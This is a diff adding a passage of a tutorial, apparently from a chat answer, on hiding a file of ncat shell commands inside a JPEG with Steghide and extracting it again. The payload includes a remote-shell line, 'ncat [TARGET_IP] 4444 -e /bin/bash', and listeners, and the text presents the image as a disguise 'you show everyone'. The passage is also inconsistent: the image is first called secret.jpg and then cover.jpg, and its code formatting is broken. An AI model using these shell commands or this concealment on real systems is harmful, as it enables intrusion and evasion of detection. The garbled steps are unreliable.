@@ -1,0 +1,36 @@
+sudo apt update && sudo apt install steghide outguess -y
+`
+
+For this exercise, we will use **Steghide**. It’s one of the most reliable and classic open-source tools for this purpose.
+
+You will need two things:
+1.  **The Cover Image:** A JPEG image (`secret.jpg`). A detailed, colorful image works best.
+2.  **The Secret File:** Create a text file (`payload.txt`) containing the `ncat` payloads we discussed:
+```text
+ncat -lvp 4444
+ncat [TARGET_IP] 4444 -e /bin/bash
+ncat --ssl -lvp 4444
+ncat --udp -lvp 53
+2. Embedding the Payload
+This is the process of hiding the payload.txt inside cover.jpg.
+
+Run this command in your Kali terminal:
+
+Bash
+steghide embed -cf cover.jpg -ef payload.txt
+-cf stands for Cover File (the image you show everyone).
+
+-ef stands for Embed File (your secret payload).
+
+Steghide will prompt you to enter a passphrase. Do not forget this. The tool uses the passphrase to both encrypt the payload (so even if someone knows how to use Steghide, they can't extract it without the password) and to seed the embedding algorithm, making the data spread less predictable.
+
+You now have a file named cover.jpg that contains your hidden payload. Compare it to the original; the difference should be imperceptible.
+
+3. Extracting the Payload
+When you want to retrieve the payloads, use the extract command:
+
+Bash
+steghide extract -sf cover.jpg
+-sf stands for Secret File (the modified image).
+
+Enter the passphrase you used when embedding, and Steghide will reconstruct payload.txt.
